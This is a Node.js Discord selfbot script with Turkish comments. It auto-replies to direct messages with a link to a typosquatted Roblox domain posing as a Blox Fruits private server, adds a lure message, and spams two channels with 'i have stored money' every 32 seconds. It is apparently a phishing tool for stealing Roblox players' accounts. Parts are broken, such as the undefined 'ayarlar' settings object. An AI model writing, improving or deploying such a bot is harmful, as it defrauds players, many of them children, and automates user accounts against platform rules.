const express = require('express');
const { Client, MessageEmbed } = require('discord.js-selfbot');
const app = express();
function sleep(milliseconds) {
var start = new Date().getTime();
for (var i = 0; i < 1e7; i++) {
if ((new Date().getTime() - start) > milliseconds){
break;
    }
  }
}

///////////////////////////////////// J4J MAIN /////////////////////////////////////

const Discord = require('discord.js-selfbot');
const client = new Discord.Client();
const data = new Map();

///////////////////////////////////// J4J READY /////////////////////////////////////

client.on('ready', () => {
        console.log(`Discord'a ${client.user.username} ismi ile giriş yaptım!`);
});

///////////////////////////////////// J4J MESSAGE /////////////////////////////////////

let sent = [];
client.on("message", async msg => {
  if (msg.channel.type === "dm") {

    if (msg.author.id === client.user.id) {
    } else {
      if (msg.author.bot) {
      } else {

        let leise = await data.get(msg.author.id)

        if (leise === 1) {
        } else {

          if(sent.includes(msg.author.id)) return;
          sent.push(msg.author.id)
           msg.channel.startTyping();
          await sleep(2500) // MESAJIN GİDECEĞİ SÜRE
          await msg.channel.send("https://www.robloxrr.com/games/2753915549/[--UPDATE]-Blox-Fruits?privateServerLinkCode=99523342034880957460172356786109")
          await msg.channel.stopTyping();

          await sleep(5000) // MESAJIN GİDECEĞİ SÜRE
          msg.channel.startTyping();
          await msg.channel.send("come my ps i have fist")
          await msg.channel.stopTyping();

          await sleep(6000) // MESAJIN GİDECEĞİ SÜRE
          await msg.channel.send("https://cdn.discordapp.com/attachments/844252386642231296/998215696167223336/unknown.png")
          await msg.channel.stopTyping();
      }
      }
    }
  }
})

///////////////////////////////////// J4J CHANNEL ID /////////////////////////////////////

client.on("guildCreate", chewy => {

  chewy });

client.on("ready", () => {
      setInterval(() => {
       let chewy = client.channels.cache.get("886331269896601640") // J4J YAPACAĞI KANAL ID

       chewy.send("i have stored money")

     }, 32000);
})

client.on("ready", () => {
      setInterval(() => {
       let chewy = client.channels.cache.get("886335293781835807") // J4J YAPACAĞI KANAL ID ( İSTERSENİZ SİLEBİLİRSİNİZ )

       chewy.send("i have stored money")

     }, 32000);
})

///////////////////////////////////// TOKEN /////////////////////////////////////

client.login(ayarlar.token)

///////////////////////////////////// TOKEN END /////////////////////////////////////
